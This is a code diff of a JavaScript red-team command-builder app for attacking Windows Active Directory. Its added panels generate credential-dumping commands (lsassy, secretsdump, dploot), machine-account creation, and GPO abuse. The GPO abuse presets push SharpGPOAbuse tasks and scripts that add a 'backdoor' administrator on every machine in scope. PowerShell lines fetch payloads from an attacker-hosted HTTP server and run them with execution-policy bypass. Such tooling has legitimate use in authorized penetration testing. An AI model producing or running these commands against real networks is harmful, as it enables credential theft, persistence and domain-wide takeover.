+  const mg = document.getElementById('cd-lsassy-m-grp');
+  if (mg) mg.style.display = t === 'lsassy' ? '' : 'none';
+  bCreds();
+}
 async function bCreds() {
   const h=gv('cd-h')||'192.168.1.10', d=gv('cd-d')||'domain.local';
   const u=gv('cd-u')||'Administrator', p=gv('cd-p')||'Password1!';
+  const t=gv('cd-t')||'secretsdump';
   const isHash=p.includes(':');
-  const creds=isHash?`${d}/${u}@${h} -hashes ${p}`:`${d}/${u}:'${p}'@${h}`;
-  // FIX: resolve impacket path
-  const path = (await resolveImpacket('secretsdump.py')) || 'secretsdump.py';
-  setH('cd-cmd', `<span class="b">python3 ${path}</span> <span class="v">${creds}</span>`);
+  let c='';
+  if(t==='lsassy') {
+    const m=gv('cd-lsassy-m');
+    if(isHash) {
+      c=`<span class="b">lsassy</span> <span class="f">-d</span> <span class="v">${d}</span> <span class="f">-u</span> <span class="v">${u}</span> <span class="f">-H</span> <span class="v">${p}</span>`;
+    } else {
+      c=`<span class="b">lsassy</span> <span class="f">-d</span> <span class="v">${d}</span> <span class="f">-u</span> <span class="v">${u}</span> <span class="f">-p '${p}'</span>`;
+    }
+    if(m) c+=` <span class="f">-m</span> <span class="v">${m}</span>`;
+    c+=` <span class="v">${h}</span>`;
+  } else {
+    const creds=isHash?`${d}/${u}@${h} -hashes ${p}`:`${d}/${u}:'${p}'@${h}`;
+    const path = (await resolveImpacket('secretsdump.py')) || 'secretsdump.py';
+    c=`<span class="b">python3 ${path}</span> <span class="v">${creds}</span>`;
+  }
+  setH('cd-cmd', c);
 }
 function bBh() {
   const dc=gv('bh-dc')||'192.168.1.10', dom=gv('bh-dom')||'domain.local';
@@ -9184,16 +9555,19 @@ function bMitm() {
 // ═══════════════════════════════════════════════════════════
 const TOOL_DB = {
   // binary → { label, install, type }
-  'certipy':     { label:'certipy',      install:'pip3 install certipy-ad',    type:'pip' },
-  'bloodyad':    { label:'bloodyAD',     install:'pip3 install bloodyad',       type:'pip' },
-  'coercer':     { label:'Coercer',      install:'pip3 install coercer',        type:'pip' },
-  'adidnsdump':  { label:'adidnsdump',   install:'pip3 install adidnsdump',     type:'pip' },
-  'ldeep':       { label:'ldeep',        install:'pip3 install ldeep',          type:'pip' },
-  'windapsearch':{ label:'windapsearch', install:'if [ -d /opt/windapsearch ]; then git -C /opt/windapsearch pull; else git clone https://github.com/ropnop/windapsearch.git /opt/windapsearch; fi && pip3 install ldap3 gssapi 2>/dev/null && ln -sf /opt/windapsearch/windapsearch.py /usr/local/bin/windapsearch', type:'git' },
-  'evil-winrm':  { label:'evil-winrm',   install:'gem install evil-winrm',      type:'gem' },
-  'pywhisker':   { label:'pywhisker (git)',  install:'if [ -d /opt/pywhisker ]; then git -C /opt/pywhisker pull; else git clone https://github.com/ShutdownRepo/pywhisker /opt/pywhisker; fi && pip3 install -r /opt/pywhisker/requirements.txt 2>/dev/null', type:'git', path:'/opt/pywhisker/pywhisker.py', searchDir:'/opt/pywhisker', searchName:'pywhisker.py' },
-  'PetitPotam':  { label:'PetitPotam (git)', install:'if [ -d /opt/PetitPotam ]; then git -C /opt/PetitPotam pull; else git clone https://github.com/ly4k/PetitPotam /opt/PetitPotam; fi', type:'git', path:'/opt/PetitPotam/PetitPotam.py', searchDir:'/opt/PetitPotam', searchName:'PetitPotam.py' },
-  'dfscoerce':   { label:'dfscoerce (git)',  install:'if [ -d /opt/dfscoerce ]; then git -C /opt/dfscoerce pull; else git clone https://github.com/efchatz/dfscoerce /opt/dfscoerce; fi', type:'git', path:'/opt/dfscoerce/dfscoerce.py', searchDir:'/opt/dfscoerce', searchName:'dfscoerce.py' },
+  'certipy':              { label:'certipy',             install:'pip3 install certipy-ad',                 type:'pip' },
+  'bloodyad':             { label:'bloodyAD',            install:'pip3 install bloodyad',                   type:'pip' },
+  'coercer':              { label:'Coercer',             install:'pip3 install coercer',                    type:'pip' },
+  'adidnsdump':           { label:'adidnsdump',          install:'pip3 install adidnsdump',                 type:'pip' },
+  'ldeep':                { label:'ldeep',               install:'pip3 install ldeep',                      type:'pip' },
+  'targetedKerberoast':   { label:'targetedKerberoast',  install:'pip3 install targetedKerberoast',         type:'pip' },
+  'lsassy':               { label:'lsassy',              install:'pip3 install lsassy',                     type:'pip' },
+  'dploot':               { label:'dploot',              install:'pip3 install dploot',                     type:'pip' },
+  'windapsearch':         { label:'windapsearch', install:'if [ -d /opt/windapsearch ]; then git -C /opt/windapsearch pull; else git clone https://github.com/ropnop/windapsearch.git /opt/windapsearch; fi && pip3 install ldap3 gssapi 2>/dev/null && ln -sf /opt/windapsearch/windapsearch.py /usr/local/bin/windapsearch', type:'git' },
+  'evil-winrm':           { label:'evil-winrm',          install:'gem install evil-winrm',                  type:'gem' },
+  'pywhisker':            { label:'pywhisker (git)',      install:'if [ -d /opt/pywhisker ]; then git -C /opt/pywhisker pull; else git clone https://github.com/ShutdownRepo/pywhisker /opt/pywhisker; fi && pip3 install -r /opt/pywhisker/requirements.txt 2>/dev/null', type:'git', path:'/opt/pywhisker/pywhisker.py', searchDir:'/opt/pywhisker', searchName:'pywhisker.py' },
+  'PetitPotam':           { label:'PetitPotam (git)',     install:'if [ -d /opt/PetitPotam ]; then git -C /opt/PetitPotam pull; else git clone https://github.com/ly4k/PetitPotam /opt/PetitPotam; fi', type:'git', path:'/opt/PetitPotam/PetitPotam.py', searchDir:'/opt/PetitPotam', searchName:'PetitPotam.py' },
+  'dfscoerce':            { label:'dfscoerce (git)',      install:'if [ -d /opt/dfscoerce ]; then git -C /opt/dfscoerce pull; else git clone https://github.com/efchatz/dfscoerce /opt/dfscoerce; fi', type:'git', path:'/opt/dfscoerce/dfscoerce.py', searchDir:'/opt/dfscoerce', searchName:'dfscoerce.py' },
 };
 
 // Panel → primary tools to check
@@ -9203,11 +9577,17 @@ const PANEL_TOOL_MAP = {
   'ad-cert':    ['certipy'],
   'ad-tickets': ['getTGT.py'],
   'ad-winrm':   ['evil-winrm'],
+  'ad-kerb':    ['targetedKerberoast'],
+  'ad-creds':   ['lsassy'],
+  'ad-dpapi':   ['dploot'],
+  'ad-gpo':     ['bloodyad'],
 };
 // Panel → t-bar element ID
 const PANEL_TBAR = {
   'ad-acl':'acl-tbar', 'ad-coerce':'crc-tbar', 'ad-cert':'adc-tbar',
   'ad-tickets':'tkt-tbar', 'ad-winrm':'ew-tbar',
+  'ad-kerb':'kerb-tbar', 'ad-creds':'crd-tbar', 'ad-dpapi':'dpa-tbar',
+  'ad-gpo':'gpo-tbar',
 };
 
 async function checkPanelTools(panelId) {
@@ -9752,6 +10132,207 @@ function bWinrm() {
   if(e) c+=` <span class="f">-e '${e}'</span>`;
   if(opts) c+=` <span class="f">${opts}</span>`;
   setH('ew-cmd', c);
+}
+// ── DELEGATION ───────────────────────────────────────────
+async function bDelegation() {
+  const tab=document.querySelector('#p-ad-deleg .tab.on');
+  const t=tab?tab.textContent.trim().toLowerCase():'find delegation';
+  let c='';
+  if(t==='find delegation') {
+    const dc=gv('dlg-f-dc')||'192.168.1.10', dom=gv('dlg-f-dom')||'domain.local';
+    const u=gv('dlg-f-u')||'user', p=gv('dlg-f-p')||'Password1!';
+    const isHash=p.includes(':');
+    const path=(await resolveImpacket('findDelegation.py'))||'findDelegation.py';
+    const creds=isHash?`${dom}/${u}@${dc} -hashes ${p}`:`${dom}/${u}:'${p}'`;
+    c=`<span class="b">python3 ${path}</span> <span class="v">${creds}</span> <span class="f">-dc-ip</span> <span class="v">${dc}</span>`;
+  } else {
+    const dc=gv('dlg-a-dc')||'192.168.1.10', dom=gv('dlg-a-dom')||'domain.local';
+    const u=gv('dlg-a-u')||'user', p=gv('dlg-a-p')||'Password1!';
+    const cn=gv('dlg-a-cn')||'EVILPC$', cp=gv('dlg-a-cp')||'P@ssw0rd123!';
+    const method=gv('dlg-a-method')||'LDAPS';
+    const isHash=p.includes(':');
+    const path=(await resolveImpacket('addcomputer.py'))||'addcomputer.py';
+    if(isHash) {
+      c=`<span class="b">python3 ${path}</span> <span class="f">-method ${method} -computer-name '${cn}' -computer-pass '${cp}' -dc-ip</span> <span class="v">${dc}</span> <span class="f">-hashes ${p}</span> <span class="v">'${dom}/${u}'</span>`;
+    } else {
+      c=`<span class="b">python3 ${path}</span> <span class="f">-method ${method} -computer-name '${cn}' -computer-pass '${cp}' -dc-ip</span> <span class="v">${dc}</span> <span class="v">'${dom}/${u}:${p}'</span>`;
+    }
+  }
+  setH('dlg-cmd', c);
+}
+// ── DPAPI ────────────────────────────────────────────────
+function bDpapi() {
+  const h=gv('dpa-h')||'192.168.1.10', d=gv('dpa-d')||'domain.local';
+  const u=gv('dpa-u')||'Administrator', p=gv('dpa-p')||'Password1!';
+  const op=gv('dpa-op')||'triage', out=gv('dpa-out'), opts=chks('dpa-opts');
+  const isHash=p.includes(':');
+  let c=`<span class="b">dploot</span> <span class="f">${op} -d</span> <span class="v">${d}</span> <span class="f">-u</span> <span class="v">${u}</span>`;
+  if(isHash) c+=` <span class="f">-H</span> <span class="v">${p}</span>`;
+  else       c+=` <span class="f">-p '${p}'</span>`;
+  if(out) c+=` <span class="f">-o</span> <span class="v">${out}</span>`;
+  if(opts) c+=` <span class="f">${opts}</span>`;
+  c+=` <span class="v">${h}</span>`;
+  setH('dpa-cmd', c);
+}
+// ── GPO ABUSE ─────────────────────────────────────────────
+async function bGpo() {
+  const dc=gv('gp-dc')||'192.168.1.10', dom=gv('gp-dom')||'domain.local';
+  const u=gv('gp-u')||'user', p=gv('gp-p')||'Password1!';
+  const isHash=p.includes(':');
+  const nt=isHash?p.split(':').pop():p;
+  const baseDn='DC='+dom.split('.').join(',DC=');
+  const auth=isHash?`-D "${u}@${dom}" -Y GSSAPI`:`-D "${u}@${dom}" -w '${p}'`;
+  const tab=document.querySelector('#p-ad-gpo .tab.on');
+  if(!tab) return;
+  const tabId=tab.dataset.tab||'enum';
+  let c='';
+  if(tabId==='enum'){
+    const t=gv('gp-enum-t')||'bloodyad';
+    if(t==='bloodyad'){
+      const creds=isHash?`-p :${nt}`:`-p '${p}'`;
+      c=`<span class="b">bloodyAD</span> <span class="f">--host ${dc} -d ${dom} -u ${u} ${creds} get writable --otype GPO</span>`;
+    } else if(t==='ldapsearch'){
+      c=`<span class="b">ldapsearch</span> <span class="f">-H ldap://${dc} ${auth} -b "${baseDn}" "(objectClass=groupPolicyContainer)" displayName gPCFileSysPath gPLink</span>`;
+    } else if(t==='dacledit'){
+      const guid=gv('gp-enum-guid')||'{GUID}';
+      const path=(await resolveImpacket('dacledit.py'))||'dacledit.py';
+      if(isHash){
+        c=`<span class="b">python3 ${path}</span> <span class="f">'${dom}/${u}' -hashes ${p} -action read -target-dn "CN=${guid},CN=Policies,CN=System,${baseDn}"</span>`;
+      } else {
+        c=`<span class="b">python3 ${path}</span> <span class="f">'${dom}/${u}:${p}' -action read -target-dn "CN=${guid},CN=Policies,CN=System,${baseDn}"</span>`;
+      }
+    }
+  } else if(tabId==='find'){
+    const t=gv('gp-find-t')||'bloodyad';
+    if(t==='bloodyad'){
+      const creds=isHash?`-p :${nt}`:`-p '${p}'`;
+      c=`<span class="b">bloodyAD</span> <span class="f">--host ${dc} -d ${dom} -u ${u} ${creds} get writable --otype GPO</span>`;
+    } else if(t==='dacledit'){
+      const guid=gv('gp-find-guid')||'{GUID}';
+      const path=(await resolveImpacket('dacledit.py'))||'dacledit.py';
+      if(isHash){
+        c=`<span class="b">python3 ${path}</span> <span class="f">'${dom}/${u}' -hashes ${p} -action read -target-dn "CN=${guid},CN=Policies,CN=System,${baseDn}"</span>`;
+      } else {
+        c=`<span class="b">python3 ${path}</span> <span class="f">'${dom}/${u}:${p}' -action read -target-dn "CN=${guid},CN=Policies,CN=System,${baseDn}"</span>`;
+      }
+    }
+  } else if(tabId==='machines'){
+    const op=gv('gp-machines-op')||'gpoinfo';
+    const guid=gv('gp-machines-guid')||'{GUID}';
+    if(op==='gpoinfo'){
+      c=`<span class="b">ldapsearch</span> <span class="f">-H ldap://${dc} ${auth} -b "CN=${guid},CN=Policies,CN=System,${baseDn}" "(objectClass=groupPolicyContainer)" displayName gPCFileSysPath</span>`;
+    } else if(op==='linkedous'){
+      c=`<span class="b">ldapsearch</span> <span class="f">-H ldap://${dc} ${auth} -b "${baseDn}" "(gPLink=*${guid}*)" distinguishedName name description</span>`;
+    } else if(op==='computers'){
+      const ou=gv('gp-machines-ou')||`OU=Computers,${baseDn}`;
+      c=`<span class="b">ldapsearch</span> <span class="f">-H ldap://${dc} ${auth} -b "${ou}" "(objectClass=computer)" name operatingSystem lastLogon userAccountControl</span>`;
+    }
+  } else if(tabId==='abuse'){
+    const ip=gv('gp-abuse-ip')||'192.168.1.99', port=gv('gp-abuse-port')||'8888';
+    const dir=gv('gp-abuse-dir')||'/opt/SharpGPOAbuse';
+    c=`<span class="b">python3</span> <span class="f">-m http.server ${port} --directory ${dir}</span>`;
+    _gpoAbusePlist(ip,port);
+  } else if(tabId==='wintools'){
+    const ip=gv('gp-win-ip')||'192.168.1.99', port=gv('gp-win-port')||'8888';
+    const t=gv('gp-win-t')||'grouper2';
+    const dir=t==='grouper2'?(gv('gp-win-g2-dir')||'/opt/Grouper2'):(gv('gp-win-pv-dir')||'/opt/PowerView');
+    c=`<span class="b">python3</span> <span class="f">-m http.server ${port} --directory ${dir}</span>`;
+    _gpoWinPlist(ip,port,t);
+  }
+  setH('gpo-cmd',c);
+}
+function _gpoAbusePlist(ip,port){
+  const gpoName=gv('gp-gpo-name')||'Default Domain Policy';
+  const preset=gv('gp-abuse-preset')||'AddLocalAdmin';
+  const tgt=gv('gp-abuse-target')||'backdoor';
+  const extra=gv('gp-abuse-extra')||'';
+  let args='', impact='';
+  if(preset==='AddLocalAdmin'){
+    args=`--AddLocalAdmin --UserAccount ${tgt} --GPOName "${gpoName}"`;
+    impact='Adds user to local Administrators on ALL machines in GPO scope';
+  } else if(preset==='ImmediateTask'){
+    args=`--AddComputerTask --TaskName "SysUpdate" --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" --Arguments "/c net user ${tgt} P@ss123! /add && net localgroup administrators ${tgt} /add" --GPOName "${gpoName}" --Force`;
+    impact='Immediate scheduled task — executes within ~5 min without reboot (runs as SYSTEM)';
+  } else if(preset==='ScheduledTask'){
+    args=`--AddComputerTask --TaskName "SysUpdate" --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" --Arguments "/c net user ${tgt} P@ss123! /add && net localgroup administrators ${tgt} /add" --GPOName "${gpoName}"`;
+    impact='Scheduled task on all computers in scope — triggers at next reboot (SYSTEM)';
+  } else if(preset==='StartupScript'){
+    args=`--AddComputerScript --ScriptName startup.bat --ScriptContents "net user ${tgt} P@ss123! /add && net localgroup administrators ${tgt} /add" --GPOName "${gpoName}"`;
+    impact='Startup script — executes on next reboot for all computers in GPO scope';
+  } else if(preset==='ShutdownScript'){
+    args=`--AddComputerScript --ScriptName shutdown.bat --ScriptContents "net user ${tgt} P@ss123! /add" --Type Shutdown --GPOName "${gpoName}"`;
+    impact='Shutdown script — executes on shutdown for all computers in GPO scope';
+  } else if(preset==='LogonScript'){
+    args=`--AddUserScript --ScriptName logon.bat --ScriptContents "net user ${tgt} P@ss123! /add" --GPOName "${gpoName}"`;
+    impact='Logon script — executes for all users in GPO scope at logon';
+  } else if(preset==='Cleanup'){
+    args=`--RemoveLocalAdmin --UserAccount ${tgt} --GPOName "${gpoName}"`;
+    impact='ROLLBACK — removes previously added local admin from GPO scope';
+  }
+  if(extra) args+=` ${extra}`;
+  const impEl=document.getElementById('gpo-impact-abuse-txt');
+  if(impEl) impEl.textContent=impact;
+  const iwr=`iwr http://${ip}:${port}/SharpGPOAbuse.exe -OutFile $env:TEMP\\SharpGPOAbuse.exe`;
+  const run=`& $env:TEMP\\SharpGPOAbuse.exe ${args}`;
+  const pl=document.getElementById('gpo-abuse-plist');
+  if(!pl) return;
+  pl.innerHTML=
+    `<div class="pitem"><span class="ptxt">${iwr}</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>`+
+    `<div class="pitem"><span class="ptxt">${run}</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>`+
+    `<div class="pitem"><span class="ptxt">SharpGPOAbuse.exe ${args}</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>`;
+}
+function _gpoWinPlist(ip,port,t){
+  const dom=gv('gp-dom')||'domain.local';
+  const pl=document.getElementById('gpo-win-plist');
+  if(!pl) return;
+  if(t==='grouper2'){
+    const mode=gv('gp-win-g2-mode')||'basic';
+    const iwr=`iwr http://${ip}:${port}/Invoke-Grouper2.ps1 -OutFile $env:TEMP\\Invoke-Grouper2.ps1`;
+    let cmd='';
+    if(mode==='basic') cmd=`powershell -ep bypass -c ". $env:TEMP\\Invoke-Grouper2.ps1; Invoke-Grouper2"`;
+    else if(mode==='full') cmd=`powershell -ep bypass -c ". $env:TEMP\\Invoke-Grouper2.ps1; Invoke-Grouper2 -FullReport"`;
+    else if(mode==='sysvol') cmd=`powershell -ep bypass -c ". $env:TEMP\\Invoke-Grouper2.ps1; Invoke-Grouper2 -Path \\\\${dom}\\SYSVOL"`;
+    else if(mode==='interesting') cmd=`powershell -ep bypass -c ". $env:TEMP\\Invoke-Grouper2.ps1; Invoke-Grouper2 -FindInteresting"`;
+    pl.innerHTML=
+      `<div class="pitem"><span class="ptxt">${iwr}</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>`+
+      `<div class="pitem"><span class="ptxt">${cmd}</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>`+
+      `<div class="pitem"><span class="ptxt">powershell -ep bypass -c ". $env:TEMP\\Invoke-Grouper2.ps1; Invoke-Grouper2 | Out-File C:\\Windows\\Temp\\g2out.txt"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>`;
+  } else {
+    const pvCmd=gv('gp-win-pv-cmd')||'Get-GPO -All';
+    const iwr=`iwr http://${ip}:${port}/PowerView.ps1 -OutFile $env:TEMP\\PowerView.ps1`;
+    const cmd=`powershell -ep bypass -c ". $env:TEMP\\PowerView.ps1; ${pvCmd}"`;
+    pl.innerHTML=
+      `<div class="pitem"><span class="ptxt">${iwr}</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>`+
+      `<div class="pitem"><span class="ptxt">${cmd}</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>`+
+      `<div class="pitem"><span class="ptxt">powershell -ep bypass -c ". $env:TEMP\\PowerView.ps1; Get-DomainGPO | Select displayName,gPCFileSysPath | fl"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>`+
+      `<div class="pitem"><span class="ptxt">powershell -ep bypass -c ". $env:TEMP\\PowerView.ps1; Get-DomainGPOLocalGroup | fl"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>`;
+  }
+}
+function gpoEnumToolChange(){
+  const t=gv('gp-enum-t')||'bloodyad';
+  const r=document.getElementById('gp-enum-guid-row');
+  if(r) r.style.display=t==='dacledit'?'':'none';
+  bGpo();
+}
+function gpoFindToolChange(){
+  const t=gv('gp-find-t')||'bloodyad';
+  const r=document.getElementById('gp-find-guid-row');
+  if(r) r.style.display=t==='dacledit'?'':'none';
+  bGpo();
+}
+function gpoMachinesOpChange(){
+  const op=gv('gp-machines-op')||'gpoinfo';
+  const r=document.getElementById('gp-machines-ou-row');
+  if(r) r.style.display=op==='computers'?'':'none';
+  bGpo();
+}
+function gpoWinToolChange(){
+  const t=gv('gp-win-t')||'grouper2';
+  const g2=document.getElementById('gp-win-g2-row');
+  const pv=document.getElementById('gp-win-pv-row');
+  if(g2) g2.style.display=t==='grouper2'?'':'none';
+  if(pv) pv.style.display=t==='powerview'?'':'none';
+  bGpo();
 }
 function bTcpdump() {
   const i=gv('td-i')||'eth0', f=gv('td-f'), c=gv('td-c'), w=gv('td-w'), op=chks('td-op');
@@ -10967,6 +11548,7 @@ bc('hx-op',bHttpx); bc('ff-op',bFfuf);
 bc('kt-op',bKatana);
 bc('nc-op',bNuclei);
 ['nc-tags-inj','nc-tags-auth','nc-tags-exp','nc-tags-cloud','nc-tags-tech','nc-tags-cve'].forEach(function(g){bc(g,bNuclei);});
+bc('kb-tkr-opts',bKerb); bc('dpa-opts',bDpapi);
 
 /* ─── CLOCK ───────────────────────────────────────────── */
 function tick() { const e=document.getElementById('clock-pill'); if(e) e.textContent=new Date().toLocaleTimeString('es-DO',{hour12:false}); }
